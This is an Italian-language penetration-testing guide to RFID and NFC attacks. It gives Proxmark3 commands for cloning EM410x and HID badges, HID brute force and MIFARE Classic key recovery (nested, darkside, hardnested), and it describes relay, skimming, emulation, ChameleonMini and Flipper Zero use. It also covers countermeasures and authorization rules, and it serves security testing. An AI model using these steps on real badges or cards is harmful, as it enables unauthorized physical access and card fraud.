# RFID Attacks

## Scopo

Questa guida copre vulnerabilità e tecniche di attacco contro sistemi RFID (Radio-Frequency Identification), utilizzati in badge, carte di accesso, pagamenti contactless e IoT.

## Prerequisiti

- Proxmark3 o lettore RFID compatibile
- Schede RFID per test (T5577, Magic UID)
- Conoscenza base radiofrequenze
- **Autorizzazione per testing**

## Hardware Consigliato

| Device | Frequenze | Prezzo | Note |
|--------|-----------|--------|------|
| Proxmark3 Easy | 125kHz, 13.56MHz | ~$50-80 | Entry level |
| Proxmark3 RDV4 | LF + HF | ~$300 | Professionale |
| ACR122U | 13.56MHz | ~$40 | Solo NFC |
| ChameleonMini | 13.56MHz | ~$100 | Emulazione |

---

## Frequenze RFID

### Low Frequency (LF) - 125/134 kHz

```
- Badge accesso (HID, EM410x)
- Tag animali
- Range: ~10cm
- Meno sicuri
```

### High Frequency (HF) - 13.56 MHz

```
- NFC, MIFARE, NTAG
- Pagamenti contactless
- Badge moderni
- Range: ~10cm
```

### Ultra High Frequency (UHF) - 860-960 MHz

```
- Logistica, inventario
- Range: fino a 12m
- EPC Gen2 standard
```

---

## Proxmark3 Setup

### Installazione

```bash
# Clone repository
git clone https://github.com/RfidResearchGroup/proxmark3.git
cd proxmark3

# Compile
make clean && make all

# Flash (se necessario)
./pm3-flash-all

# Avvio
./pm3
```

### Comandi Base

```bash
# Help
pm3> help

# Hardware info
pm3> hw status
pm3> hw tune
```

---

## Low Frequency Attacks

### Scan LF

```bash
pm3> lf search
pm3> lf em 410x reader
pm3> lf hid reader
```

### Clone EM410x

```bash
# Leggi originale
pm3> lf em 410x reader

# Scrivi su T5577
pm3> lf em 410x clone --id XXXXXXXXXX
```

### Clone HID

```bash
# Leggi
pm3> lf hid reader

# Clone
pm3> lf hid clone --raw XXXXXXXXXXXXXXXX

# Con facility code e card number
pm3> lf hid clone -w H10301 --fc 123 --cn 12345
```

### Brute Force

```bash
# HID brute force (attenzione: può lockare sistemi)
pm3> lf hid brute -w H10301 --fc 123 --cn 0
```

---

## High Frequency Attacks

### Scan HF

```bash
pm3> hf search
pm3> hf mf info
```

### MIFARE Classic Attacks

```bash
# Default keys check
pm3> hf mf chk

# Nested attack (se almeno 1 key nota)
pm3> hf mf nested

# Darkside attack (se nessuna key nota)
pm3> hf mf darkside

# Dump card
pm3> hf mf dump
```

### MIFARE Hardnested

```bash
# Per settori con chiavi non-default
pm3> hf mf hardnested --blk 0 -a --tblk 4 -b
```

### Clone MIFARE

```bash
# Magic UID card (gen1a, gen2)
pm3> hf mf csetuid --uid XXXXXXXX
pm3> hf mf restore
```

### MIFARE DESFire

```bash
# Più sicuro, ma vulnerabilità esistono
pm3> hf mfdes info
pm3> hf mfdes auth -m 0 -k 00000000000000000000000000000000
```

---

## NFC Attacks

### Lettura NFC

```bash
pm3> hf 14a info
pm3> hf mfu info  # Ultralight
pm3> hf ntag info  # NTAG
```

### Android NFC

```bash
# NFC Tools (app)
# Leggi e scrivi tag
# Emula tag
```

### Relay Attack

```
1. Vittima con carta NFC
2. Reader vicino vittima
3. Comunicazione relay
4. Emulatore vicino terminale
5. Transazione completata
```

### NFCGate

```bash
# Android app per relay
# https://github.com/nfcgate/nfcgate
# Richiede 2 device rooted
```

---

## Attacchi Specifici

### RFID Skimming

```
- Long-range reader nascosto
- Legge badge in prossimità
- Wallet/porta-badge schermato per protezione
```

### Cloning Badge

```bash
# 1. Avvicina Proxmark a badge
pm3> lf hid reader

# 2. Copia su carta writeable
pm3> lf hid clone --raw XXXX

# 3. Usa clone per accesso
```

### Emulazione

```bash
# Proxmark emula badge
pm3> lf hid sim --raw XXXXXXXXXXXXXXXX

# ChameleonMini
# Emula multiple carte
```

---

## Mifare Vulnerabilità Note

| Vulnerabilità | Tipo | Impact |
|---------------|------|--------|
| Crypto1 weakness | Classic | Chiave recuperabile |
| Nested attack | Classic | Key recovery veloce |
| Darkside | Classic | Zero-key attack |
| Default keys | All | Accesso immediato |

---

## Protezioni e Bypass

### MIFARE Plus/DESFire

```
- AES-128 encryption
- Più robusto di Classic
- Ma implementation flaws possibili
```

### Schermatura

```
# RFID blocking wallet/sleeve
# Faraday cage per carte
```

### Detection Skimming

```
# App che rileva lettori NFC
# Monitoring accessi anomali
```

---

## ChameleonMini

```bash
# Firmware
git clone https://github.com/emsec/ChameleonMini.git

# GUI
git clone https://github.com/iceman1001/ChameleonMini-rebootedGUI.git

# Comandi base
SLOT=1
CONFIG=MF_CLASSIC_4K
UPLOAD dump.bin
CLONE
```

---

## Flipper Zero

```bash
# Multi-tool portatile
# RFID 125kHz
# NFC 13.56MHz
# Sub-GHz
# IR

# Read
RFID > Read

# Emulate
RFID > Saved > Emulate
```

---

## Contromisure

### Tecniche

```
- Migra a MIFARE DESFire
- Multi-factor authentication
- Encryption su tutti i settori
- Rolling codes
- Anti-cloning mechanisms
```

### Organizzative

```
- Badge visibili
- Audit accessi
- Cambio carte periodico
- Formazione dipendenti
```

---

## Best Practices

- **Authorization**: Solo su sistemi autorizzati
- **Lab testing**: Usa carte test dedicate
- **Legal**: Verifica normative clonazione
- **Responsible**: Non usare clone per accessi non autorizzati
- **Reporting**: Documenta vulnerabilità per remediation

## Riferimenti

- [Proxmark3 Wiki](https://github.com/RfidResearchGroup/proxmark3/wiki)
- [MIFARE Classic - The Crypto1](https://www.cs.bham.ac.uk/~garciaf/publications/Dismantling.Mifare.pdf)
- [Iceman Fork](https://github.com/RfidResearchGroup/proxmark3)
- [RFID Hacking Guide](https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/)
